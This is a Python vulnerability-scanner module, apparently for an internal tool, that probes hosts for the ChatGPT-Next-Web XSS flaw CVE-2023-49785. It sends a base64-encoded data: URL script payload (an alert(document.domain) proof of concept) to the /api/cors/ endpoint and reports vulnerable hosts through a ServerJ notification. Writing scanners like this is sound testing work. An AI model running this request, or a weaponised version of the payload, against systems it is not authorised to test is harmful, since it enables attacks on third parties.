from Config import ServerJ
from Config.Common_Request import common_request

bugName = 'ChatGPT-Next-Web XSS漏洞复现(CVE-2023-49785)'

def scan_ChatGPT_Next_Web_XSS_CVE_2023_49785(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/api/cors/data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23"

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    }
    response = common_request(url, path, headers, method='GET', timeout=10 ,proxies=proxies, append_to_output=append_to_output)
    if response is not None:
        if response.status_code == 200 and "alert" in response.text:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
